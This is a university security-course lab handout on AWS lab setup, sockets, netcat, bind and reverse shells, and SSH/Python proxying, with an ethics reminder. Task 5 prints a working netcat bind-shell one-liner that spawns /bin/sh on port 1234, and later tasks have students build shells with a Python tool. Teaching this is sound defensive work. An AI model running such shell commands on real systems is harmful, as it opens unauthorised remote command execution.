# Lab 1 - Making Connections...

### Introduction to the lab space
The purpose of lab 0 is to familiarize yourself with the lab space we will be
using for the remainder of the labs.  You should have received an email
regarding your AWS Educate account for this class.  We will be using AWS to
create virtual environments for you to use to complete the tasks given.

### A Note on Ethics
Much of the material in these labs could be used to gain access to a wide
array of systems both on and off campus.  I would like to remind everyone
that gaining access to such systems without permission would be a violation
of Wright Way policy (and possibly several laws) which can be punishable up 
to expulsion from the University (or a criminal suit being brought against
the student.

That being said we are here to learn, if you suspect/discover that a site 
or server may be vulnerable please bring it up in class so that we can 
discuss proper methods of requesting permission to perform a pen test and
proper remediation.

### Objectives
1. Become familiar with creating lab environments via AWS CloudFormation files
3. Brush up on networking topics needed for this course including:
   * sockets
   * client/server model
   * tunnels/proxies
2. Start building your git(hub) toolbox

### Background
There are all sorts of useful tools to scan, sniff, crawl, hack, crack, and
otherwise pwn a network but all of them are useless if you don't know how to
connect to it.  In this lab you will be making a simple connection to your AWS
environment using a tool called SSH.  You will then investigate advanced
connection techniques such as tunnels, proxies, and reverse shells.

### Resources and Setup

##### Resources
* This Github repository (/code)
* AWS Educate Environment

##### Setup
* Register for an account at https://github.com/
* Complete The AWS Educate Registration
* Create a Fork of this repository so you have it for your records
* Install Python 2.7, I recommend using [Anaconda Python](https://www.anaconda.com/distribution/)

###### Windows Only Setup
We are going to be making many connections to linux servers via SSH, some will
even have graphical applications that we will be accessing locally.  To do this
you will need an SSH client and local X server.  There are many options out
there and you are free to use whichever one you want; however, we will only be
supporting the following environment (which I would recommend trying out, if you
have a better suggestion send it to Matt Kijowski via Lab Talk).

* [Install Windows Subsystem for Linux (WSL)](https://docs.microsoft.com/en-us/windows/wsl/install-win10)
* Install Ubuntu 18.04 LTS from the Windows store
* Launch Ubuntu 18.04 LTS Bash to finish configuring your account
  (username/password)
* [Install MobaXterm Home Edition](https://mobaxterm.mobatek.net/download.html)

### Lab Procedure
Perform the following tasks.  Document your progress in a plain text file named
`lab01.txt`.

At the top of the file please enter your personal details as follows:
```
Name: Your name
Email: Your email

```
For each task give a summary of steps taken and document any challenges 
you faced.  Be sure to answer all questions asked.

### Task 1 - Provision the lab environment in AWS.  
Assuming you have registerd for AWS Educate and have access to this class 
perform the following:

* [Sign in to AWS educate](https://www.awseducate.com/signin/SiteLogin),
  go to the CEG 4900/6900 Cyber Security Analysis - Applied classroom, then click
  the blue AWS Console button.  
  
  This will launch the AWS console (may require two
  clicks if you were already signed in to AWS with your personal account) and sign
  you in as a federated user with a username looking like
  `vocstartsoft/user236529=lastname.number@wright.edu`.
* Create a SSH key pair via AWS for signing in to your systems.  To do this
  select the [EC2 service from the AWS console](https://console.aws.amazon.com/ec2/v2/home?region=us-east-1#Home:).
  In the center area you should see a list of all Resources you have
  available (you will be returning here often).  Right now they should all be 0.
* Click on [0 Key Pairs](https://console.aws.amazon.com/ec2/v2/home?region=us-east-1#KeyPairs:sort=keyName)
  From here you should see no existing SSH key pairs.  
* Click on the `Create Key Pair` blue button.  This will create a 
  public/private key pair, stores the public key in AWS, and downloads the
  private key to your local machine.  
* **Do not lose this private key.**  Doing so will prevent you from being
  able to access any labs created with it.  If you do lose it simply delete it
  from AWS and create a new one.
* [Once you have created your SSH key, click here to provision lab1](https://console.aws.amazon.com/cloudformation/home?region=us-east-1#/stacks/new?stackName=CEG-4900Lab01&templateURL=https:%2F%2Fs3.amazonaws.com%2Fwsu-cecs-cf-templates%2Fceg4900lab1.yml)
  This will take you to another AWS service called Cloud Formation (AWS CF).  The
  link will automatically fill most of the fields necessary, you will need to
  select the SSH key you just created from the drop down menu.  After selecting
  your key keep clicking next to finalize creation of your lab space.

* Once you have created the AWS Cloud formation stack you can [return to the EC2 service](https://console.aws.amazon.com/ec2/v2/home?region=us-east-1#Home:).
  Here you should see additional resources have been created. 
* [Click on Running Instances](https://console.aws.amazon.com/ec2/v2/home?region=us-east-1#Instances:sort=instanceState)
  to see information about the servers created as a part of the cloud formation
  template.  You will need to retrieve the Elastic IP of the Ubuntu instance by
  selecting it and looking at the information in the Description below.

*Note: There are no questions to answer in Task 1.  Please just document your
experience creating the lab environment.*

### Task 2 - Connecting to the AWS environment
**You are now ready to make an SSH connection to your AWS server.**  Using
MobaXterm perform the following actions:
* Create/copy the AWS private SSH key to your home directory
* Make the key only readable by your user (`chmod`)
* SSH into your AWS server with the following (replace */path/to/private/key*
  and *ElasticIP* with your information):
  `ssh -i /path/to/private/key ubuntu@ElasticIP`
  

### Task 3 - Sockets
There are many tools and applications that allow you to create networked
servers but at the heart of them all are sockets.  A *socket* is one endpoint
in a two way communication link between two programs.
The `code/tcp-client.py` is a simple python program that creates a client 
socket.  Using this python program answer the following questions:

1. What IP address and port is `tcp-client.py` connecting to?
2. What server application is running at the other end of the communication link?
3. Use `tcp-client.py` to make a connection over port 22 to the AWS instance at
   10.0.0.30.  What information did you recieve?

4. On the other end of the communication channel is the server.  The file 
   `code/tcp-server.py` is a simple tcp server program using the python 
   `socket` libraries.  What port is `tcp-server.py` connecting to?

5. Execute `tcp-server.py` on your AWS Ubuntu Public system.
   Make the necessary changes to `tcp-client.py` so that it will connect to 
   your `tcp-server.py` socket from your local machine.  Connect to your AWS 
   `tcp-server.py` socket with your local `tcp-client.py`.
   Describe the IP addresses and ports associated with both sockets associated
   with this connection.

### Task 4 - Simple sockets with Netcat
Now that you have some experience working with sockets, research `netcat` 
(frequently abbreviated to `nc`).

Using `nc`, make a connection to `www.wright.edu` over port 80 and send the
same `GET` request as in `code/tcp-client.py`.

1. Is the output the same?  Why or why not?
2. Using `nc` only, establish two sockets, one client and one server, capable
   of passing data between one another.  Describe both sockets and list the
   commands used to create them.

### Task 5 - Reverse and bind Shells
Now that you have some experience creating sockets, lets take a look at likely
the most popular usage of `nc`, [bind and reverse shells.](https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/) 
then continue.  Bind and reverse shells are the bread and butter of attackers
and pentesters.  Many of the vulnerabilities we will be taking a look at in
this class have the same end result: Remote Command Execution, meaning they
allow an attacker or pentester to run an arbitrary commancd remotely without
the need to be signed in or even have an account on the system.  But how much
damage could an atacker do with `cd` or `ls` (rhetorical, no need to answer
this one).  Instead, investigate the following linux command(s):

```
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 1234 >/tmp/f
```

Execute the above on your AWS machine and connect to it from your local
machine.  

1. Describe what the above commands do (hint: try sending it `ls` followed by a 
   return.)  Break it down into three sub commands and describe each one
   ```
   rm /tmp/f
   mkfifo /tmp/f
   cat /tmp/f | /bin/sh -i 2>&1 | nc -l 1234 >/tmp/f
   ```
2. Would this be considered a reverse or a bind shell?
3. What complications would there be in setting up a reverse shell from our AWS
   system to your home PC?
2. Do you feel comfortable leaving this command running?  What would happen
   if someone else connected to this socket?

*Note: This class is focused on python but [reverse shells can be spun up
in a number of other languages](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).*

### Task 6 - Turns out Task 3 was not a waste of time...
Because of some of the dangerous things that `nc` can do, most system
administrators do not have it installed.  While this does prevent a simple
one-line unix command from allowing anyone in to a shell, there are many other
ways to create a reverse or bind shell assuming there is a programming language
installed with a `socket()` library (like python).

Investigate the `code/bhpnet.py`, explain what it does.  Use `bhpnet.py` to
create a bind shell.

1. List the commands used to establish a reverse shell with `bhpnet.py` and how
   to connect to it with `nc`.  
2. Does this shell differ at all from the previous reverse shell you created?
   Why or why not?


### Task 7 - Proxies and tunnels
As a pen tester (or attacker) you may not be interested in the system that you
can execute commands/code on but that does not make it useless to you.  Instead
of attempting to gain elevated privileges on a server, you can instead use it
as a [proxy server](https://en.wikipedia.org/wiki/Proxy_server).

Your AWS environment actually created two systems, so far you have been
connecting to *Ubuntu Public* because it has a publicly accessible IP.

Assume that the server you were really interested is on *Ubuntu Private*.
You have the private IP of this server (10.0.0.30) but you have no route to
this system.  Inspect `code/proxy.py` on *Ubuntu Public*.  Use proxy.py to 
connect to *Ubuntu Private* over SSH from your local machine.

1. Describe all *4* sockets used in this connection.  You do not yet have the
   tools to identify all ports used in this connection, but you should be able
   to identify most of them.
2. List the commands you used and what sockets those commands created.
3. Create the same proxy using `ssh -L`.  Describe the commands used and what
   sockets they created.


### Acknowledgement
Portions of this lab were derived from Black Hat Python: Python Programming for
Hackers and Pentesters, by Justin Seitz.
